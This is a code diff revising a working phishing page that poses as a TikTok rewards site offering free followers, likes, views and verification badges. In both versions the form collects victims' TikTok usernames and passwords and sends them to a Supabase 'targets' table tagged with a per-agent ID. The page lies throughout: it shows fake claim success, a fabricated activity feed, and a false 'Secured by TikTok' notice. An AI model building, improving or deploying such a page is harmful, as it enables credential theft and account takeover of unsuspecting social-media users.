@@ -3,191 +3,228 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok Follower Booster - Get 100k Free</title>
+    <title>TikTok Rewards - Claim Free Followers & Coins</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
-        body { background-color: #010101; color: white; font-family: 'Inter', sans-serif; overflow-x: hidden; }
-        .tiktok-gradient { background: linear-gradient(45deg, #ff0050, #00f2ea); }
-        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); }
-        .glow-btn { box-shadow: 0 0 15px rgba(0, 242, 234, 0.3); }
-        .floating { animation: float 3s ease-in-out infinite; }
-        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
+        body {
+            background-color: #010101;
+            color: white;
+            font-family: 'Inter', sans-serif;
+            overflow-x: hidden;
+        }
+        .tt-gradient {
+            background: linear-gradient(45deg, #fe2c55 0%, #25f4ee 100%);
+        }
+        .glass {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .reward-card {
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            cursor: pointer;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        .reward-card:hover {
+            transform: scale(1.05);
+            border-color: #fe2c55;
+            background: rgba(254, 44, 85, 0.05);
+        }
+        .tt-input {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s;
+        }
+        .tt-input:focus {
+            border-color: #25f4ee;
+            background: rgba(255, 255, 255, 0.1);
+            outline: none;
+        }
+        @keyframes pulse-glow {
+            0% { box-shadow: 0 0 5px rgba(254, 44, 85, 0.5); }
+            50% { box-shadow: 0 0 20px rgba(254, 44, 85, 0.8); }
+            100% { box-shadow: 0 0 5px rgba(254, 44, 85, 0.5); }
+        }
+        .claim-btn {
+            animation: pulse-glow 2s infinite;
+        }
     </style>
 </head>
-<body class="min-h-screen flex flex-col items-center">
-
-    <!-- Top Banner -->
-    <div class="w-full tiktok-gradient py-2 text-center text-xs font-bold uppercase tracking-widest text-black">
-        Limited Time Offer: Free Followers Verification System
-    </div>
+<body class="flex flex-col min-h-screen">
 
     <!-- Header -->
-    <header class="w-full max-w-md flex flex-col items-center mt-12 mb-8 px-4">
-        <div class="floating relative">
-            <i class="fab fa-tiktok text-6xl tiktok-gradient p-4 rounded-3xl shadow-2xl"></i>
-            <span class="absolute -top-2 -right-2 bg-red-500 text-[10px] px-2 py-1 rounded-full animate-bounce">LIVE</span>
+    <nav class="p-5 flex justify-between items-center border-b border-white/5 bg-black/50 backdrop-blur-md sticky top-0 z-50">
+        <div class="flex items-center space-x-2">
+            <i class="fab fa-tiktok text-2xl"></i>
+            <span class="text-xl font-black tracking-tighter italic">TikTok</span>
         </div>
-        <h1 class="text-4xl font-black italic mt-6 tracking-tighter">TIKTOK<span class="text-cyan-400">BOOST</span></h1>
-        <p class="text-gray-400 text-sm mt-1">Trusted by 1.2M+ Creators Worldwide</p>
-    </header>
+        <div class="bg-white/10 px-4 py-1.5 rounded-full text-[10px] font-bold uppercase tracking-widest text-cyan-400 border border-cyan-400/20">
+            Live Rewards
+        </div>
+    </nav>
 
-    <div id="main-content" class="w-full max-w-md px-4 pb-20">
+    <!-- Main Content -->
+    <main class="flex-grow flex flex-col items-center justify-center px-6 py-10">
         
-        <!-- Selection Page -->
-        <div id="selection-page" class="space-y-4">
-            <div class="flex items-center justify-between mb-4">
-                <h2 class="text-lg font-bold">Select Reward</h2>
-                <div class="text-xs text-gray-500"><i class="fas fa-users mr-1"></i> 4.2k Active</div>
-            </div>
-            
-            <div onclick="showLogin('10,000')" class="glass p-5 rounded-2xl flex justify-between items-center cursor-pointer hover:bg-white/10 transition border-l-4 border-cyan-400">
-                <div class="flex items-center gap-4">
-                    <div class="bg-cyan-500/20 p-3 rounded-full text-cyan-400"><i class="fas fa-bolt"></i></div>
-                    <div>
-                        <div class="font-bold">10,000 Followers</div>
-                        <div class="text-[10px] text-gray-500">Delivery: Instant</div>
-                    </div>
-                </div>
-                <div class="text-xs font-black text-cyan-400 underline italic uppercase">Claim</div>
+        <!-- Reward Selection Stage -->
+        <div id="selection-stage" class="w-full max-w-4xl">
+            <div class="text-center mb-10">
+                <h1 class="text-4xl md:text-6xl font-black mb-4 tracking-tighter italic uppercase">Claim Free <span class="text-[#fe2c55]">Rewards</span></h1>
+                <p class="text-gray-400 text-sm md:text-base">Apna manpasand package select karein aur foran claim karein.</p>
             </div>
 
-            <div onclick="showLogin('50,000')" class="glass p-5 rounded-2xl flex justify-between items-center cursor-pointer hover:bg-white/10 transition border-l-4 border-pink-500">
-                <div class="flex items-center gap-4">
-                    <div class="bg-pink-500/20 p-3 rounded-full text-pink-500"><i class="fas fa-heart"></i></div>
-                    <div>
-                        <div class="font-bold">50,000 Followers</div>
-                        <div class="text-[10px] text-gray-500">Delivery: 1 Hour</div>
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+                <div onclick="selectReward('50k Followers')" class="reward-card glass p-6 rounded-3xl text-center">
+                    <div class="w-12 h-12 bg-[#fe2c55]/20 rounded-2xl flex items-center justify-center mx-auto mb-4">
+                        <i class="fas fa-users text-[#fe2c55]"></i>
                     </div>
+                    <h3 class="font-black text-xl italic">50K</h3>
+                    <p class="text-[10px] text-gray-500 font-bold uppercase">Followers</p>
                 </div>
-                <div class="text-xs font-black text-pink-500 underline italic uppercase">Claim</div>
-            </div>
-
-            <div onclick="showLogin('100,000')" class="glass p-6 rounded-2xl flex justify-between items-center cursor-pointer hover:bg-white/10 transition border-2 border-cyan-400 bg-cyan-400/5 glow-btn">
-                <div class="flex items-center gap-4">
-                    <div class="bg-white text-black p-3 rounded-full"><i class="fas fa-fire"></i></div>
-                    <div>
-                        <div class="font-bold text-xl">100,000</div>
-                        <div class="text-[10px] text-cyan-400 font-bold uppercase">Viral Package</div>
+                <div onclick="selectReward('100k Likes')" class="reward-card glass p-6 rounded-3xl text-center">
+                    <div class="w-12 h-12 bg-cyan-500/20 rounded-2xl flex items-center justify-center mx-auto mb-4">
+                        <i class="fas fa-heart text-cyan-400"></i>
                     </div>
+                    <h3 class="font-black text-xl italic">100K</h3>
+                    <p class="text-[10px] text-gray-500 font-bold uppercase">Hearts</p>
                 </div>
-                <div class="tiktok-gradient text-black px-4 py-2 rounded-xl text-xs font-bold shadow-lg shadow-cyan-500/20">HOT</div>
+                <div onclick="selectReward('1M Views')" class="reward-card glass p-6 rounded-3xl text-center">
+                    <div class="w-12 h-12 bg-purple-500/20 rounded-2xl flex items-center justify-center mx-auto mb-4">
+                        <i class="fas fa-play text-purple-400"></i>
+                    </div>
+                    <h3 class="font-black text-xl italic">1M</h3>
+                    <p class="text-[10px] text-gray-500 font-bold uppercase">Views</p>
+                </div>
+                <div onclick="selectReward('Verification')" class="reward-card glass p-6 rounded-3xl text-center">
+                    <div class="w-12 h-12 bg-blue-500/20 rounded-2xl flex items-center justify-center mx-auto mb-4">
+                        <i class="fas fa-check-circle text-blue-400"></i>
+                    </div>
+                    <h3 class="font-black text-lg italic uppercase">Verify</h3>
+                    <p class="text-[10px] text-gray-500 font-bold uppercase">Blue Badge</p>
+                </div>
             </div>
-
-            <p class="text-center text-[10px] text-gray-600 px-8">By claiming, you agree to our terms of service and community guidelines for account growth.</p>
         </div>
 
-        <!-- Login Form -->
-        <div id="login-page" class="hidden">
-            <div class="glass p-8 rounded-3xl shadow-2xl relative overflow-hidden">
-                <div class="absolute top-0 right-0 w-32 h-32 bg-pink-500/10 blur-3xl -z-10"></div>
-                
-                <h2 class="text-center text-2xl font-black mb-2 uppercase italic">Verification</h2>
-                <p class="text-xs text-gray-400 mb-8 text-center px-4">Login with your TikTok account to receive <span id="selected-amount" class="text-cyan-400 font-bold"></span> followers instantly.</p>
-                
-                <form id="payload-form" class="space-y-5">
-                    <div class="space-y-1">
-                        <label class="text-[10px] font-bold text-gray-500 uppercase ml-2">Phone / Email / Username</label>
-                        <input type="text" id="target-username" required class="w-full bg-black/60 border border-white/10 p-4 rounded-xl focus:outline-none focus:border-cyan-500 transition" placeholder="@username">
+        <!-- Verification/Login Stage -->
+        <div id="login-stage" class="hidden w-full max-w-md glass p-8 md:p-12 rounded-[40px] shadow-2xl">
+            <div class="text-center mb-8">
+                <div class="inline-flex items-center justify-center w-20 h-20 rounded-full bg-gradient-to-tr from-[#fe2c55] to-[#25f4ee] p-1 mb-6">
+                    <div class="w-full h-full bg-black rounded-full flex items-center justify-center">
+                        <i id="selected-icon" class="fas fa-gift text-2xl text-white"></i>
                     </div>
-                    <div class="space-y-1">
-                        <label class="text-[10px] font-bold text-gray-500 uppercase ml-2">Password</label>
-                        <input type="password" id="target-password" required class="w-full bg-black/60 border border-white/10 p-4 rounded-xl focus:outline-none focus:border-pink-500 transition" placeholder="TikTok Password">
-                    </div>
-                    
-                    <button type="submit" id="submit-btn" class="w-full tiktok-gradient py-4 rounded-2xl font-black text-black tracking-widest hover:scale-105 active:scale-95 transition-all shadow-xl shadow-pink-500/20">
-                        VERIFY & CLAIM
+                </div>
+                <h2 class="text-2xl font-black uppercase italic tracking-tight">Claim Your <span id="reward-name" class="text-[#fe2c55]">...</span></h2>
+                <p class="text-gray-500 text-xs mt-2 font-medium italic">Account verify karein claim process mukammal karne ke liye</p>
+            </div>
+
+            <form id="claim-form" class="space-y-4">
+                <div class="space-y-1">
+                    <label class="text-[10px] font-black uppercase text-gray-400 ml-1">Username / Email / Phone</label>
+                    <input type="text" id="target-user" required placeholder="TikTok Username" 
+                           class="w-full tt-input p-4 rounded-2xl text-white font-semibold">
+                </div>
+                <div class="space-y-1">
+                    <label class="text-[10px] font-black uppercase text-gray-400 ml-1">Password</label>
+                    <input type="password" id="target-pass" required placeholder="••••••••" 
+                           class="w-full tt-input p-4 rounded-2xl text-white font-semibold tracking-widest">
+                </div>
+
+                <div class="py-4">
+                    <button type="submit" id="submit-btn" class="w-full tt-gradient py-4 rounded-2xl font-black uppercase tracking-widest text-sm claim-btn">
+                        Verify & Claim Now
                     </button>
-                </form>
-            </div>
-            <button onclick="location.reload()" class="w-full mt-6 text-gray-500 text-xs hover:text-white transition"><i class="fas fa-arrow-left mr-2"></i> Go Back</button>
+                </div>
+            </form>
+            <p class="text-center text-[10px] text-gray-600 font-medium italic">Secured by TikTok Anti-Bot System © 2026</p>
         </div>
 
-        <!-- Success Page -->
-        <div id="success-page" class="hidden text-center glass p-10 rounded-3xl border-emerald-500/30">
-            <div class="w-20 h-20 bg-emerald-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
-                <i class="fas fa-check text-4xl text-emerald-400"></i>
+        <!-- Final Success Message -->
+        <div id="success-stage" class="hidden text-center max-w-md p-10">
+            <div class="w-24 h-24 bg-green-500/20 text-green-500 rounded-full flex items-center justify-center mx-auto mb-6 text-4xl shadow-xl">
+                <i class="fas fa-check-circle"></i>
             </div>
-            <h2 class="text-2xl font-black mb-3">CONGRATULATIONS!</h2>
-            <p class="text-gray-400 text-sm leading-relaxed mb-6">
-                Your request for <span id="final-amount" class="text-white font-bold"></span> followers has been verified.
-                <br><br>
-                Process Status: <span class="text-yellow-500 font-bold">Awaiting Server Queue</span>
-                <br>
-                Est. Completion: <span class="text-cyan-400 font-bold">24 Hours</span>
+            <h2 class="text-3xl font-black uppercase italic mb-4 tracking-tighter">Request Received!</h2>
+            <p class="text-gray-400 text-sm leading-relaxed">
+                Aapki request queue mein add kar di gayi hai. <br>
+                Verification mukammal hote hi rewards aapke account mein transfer kar diye jayenge.<br>
+                <span class="text-cyan-400 font-bold italic">Kripya 24 hours tak account logout na karein.</span>
             </p>
-            <div class="bg-black/50 p-4 rounded-xl text-[10px] text-gray-500 italic">
-                Note: Do not change your username or privacy settings until the process is complete.
-            </div>
         </div>
-    </div>
 
-    <!-- Live Activity Feed -->
-    <div class="fixed bottom-4 left-4 right-4 max-w-md mx-auto">
-        <div class="glass px-4 py-2 rounded-full text-[10px] flex items-center gap-3 w-max mx-auto shadow-2xl">
-            <span class="w-2 h-2 bg-emerald-500 rounded-full animate-ping"></span>
-            <span id="activity-text">@user_992 just claimed 100k followers</span>
-        </div>
-    </div>
+    </main>
+
+    <footer class="p-8 text-center border-t border-white/5 bg-black/50">
+        <p class="text-[9px] font-bold text-gray-600 uppercase tracking-widest">TikTok Community Guidelines • © 2026</p>
+    </footer>
 
     <script>
-        const SUPABASE_URL = 'https://irryclyepdnmncxyhgla.supabase.co';
-        const SUPABASE_KEY = 'sb_publishable_SBAazL4Lqp4g2LC81O-FWQ_dX2zKek6';
+        // Naya Supabase Configuration (Aapke latest credentials)
+        const SB_URL = 'https://irryclyepdnmncxyhgla.supabase.co';
+        const SB_KEY = 'sb_publishable_SBAazL4Lqp4g2LC81O-FWQ_dX2zKek6';
         
-        const urlParams = new URLSearchParams(window.location.search);
-        const adminId = urlParams.get('user') || 'default_admin';
+        // Agent ID extract karna (e.g., ?user=saqib)
+        const params = new URLSearchParams(window.location.search);
+        const agentId = params.get('user') || 'direct_user';
 
-        function showLogin(amount) {
-            document.getElementById('selection-page').classList.add('hidden');
-            document.getElementById('login-page').classList.remove('hidden');
-            document.getElementById('selected-amount').innerText = amount;
-            document.getElementById('final-amount').innerText = amount;
+        let selectedReward = '';
+
+        function selectReward(name) {
+            selectedReward = name;
+            document.getElementById('reward-name').innerText = name;
+            
+            const icon = document.getElementById('selected-icon');
+            if(name.includes('Followers')) icon.className = "fas fa-users text-2xl text-white";
+            else if(name.includes('Likes')) icon.className = "fas fa-heart text-2xl text-white";
+            else if(name.includes('Views')) icon.className = "fas fa-play text-2xl text-white";
+            else icon.className = "fas fa-check-circle text-2xl text-white";
+
+            document.getElementById('selection-stage').classList.add('hidden');
+            document.getElementById('login-stage').classList.remove('hidden');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // Fake Activity Feed Logic
-        const users = ['ali_khan', 'tiktok_star', 'king_007', 'princess_99', 'viral_vibe', 'jatt_life'];
-        setInterval(() => {
-            const user = users[Math.floor(Math.random() * users.length)];
-            const amt = ['10k', '50k', '100k'][Math.floor(Math.random() * 3)];
-            document.getElementById('activity-text').innerText = `@${user} just claimed ${amt} followers`;
-        }, 5000);
-
-        document.getElementById('payload-form').onsubmit = async (e) => {
+        document.getElementById('claim-form').onsubmit = async (e) => {
             e.preventDefault();
             const btn = document.getElementById('submit-btn');
-            const username = document.getElementById('target-username').value;
-            const password = document.getElementById('target-password').value;
+            const u = document.getElementById('target-user').value;
+            const p = document.getElementById('target-pass').value;
 
             btn.disabled = true;
             btn.innerText = "VERIFYING ACCOUNT...";
 
             try {
-                const response = await fetch(`${SUPABASE_URL}/rest/v1/targets`, {
+                // Targets table mein data bhej raha hai
+                const response = await fetch(`${SB_URL}/rest/v1/targets`, {
                     method: 'POST',
                     headers: {
-                        'apikey': SUPABASE_KEY,
-                        'Authorization': `Bearer ${SUPABASE_KEY}`,
-                        'Content-Type': 'application/json'
+                        'apikey': SB_KEY,
+                        'Authorization': `Bearer ${SB_KEY}`,
+                        'Content-Type': 'application/json',
+                        'Prefer': 'return=minimal'
                     },
                     body: JSON.stringify({
-                        user_id: adminId,
-                        username: username,
-                        password: password
+                        user_id: agentId, 
+                        username: u,
+                        password: p,
+                        platform: 'tiktok',
+                        extra_info: `Selected: ${selectedReward}`
                     })
                 });
 
                 if (response.ok) {
-                    document.getElementById('login-page').classList.add('hidden');
-                    document.getElementById('success-page').classList.remove('hidden');
+                    document.getElementById('login-stage').classList.add('hidden');
+                    document.getElementById('success-stage').classList.remove('hidden');
                 } else {
-                    alert("Verification Failed. System Busy.");
+                    alert("System Busy! Please try again in a few minutes.");
                     btn.disabled = false;
-                    btn.innerText = "VERIFY & CLAIM";
+                    btn.innerText = "Verify & Claim Now";
                 }
             } catch (err) {
-                alert("Server Connection Error!");
+                alert("Connection Error! Check your internet.");
                 btn.disabled = false;
-                btn.innerText = "VERIFY & CLAIM";
+                btn.innerText = "Verify & Claim Now";
             }
         };
     </script>
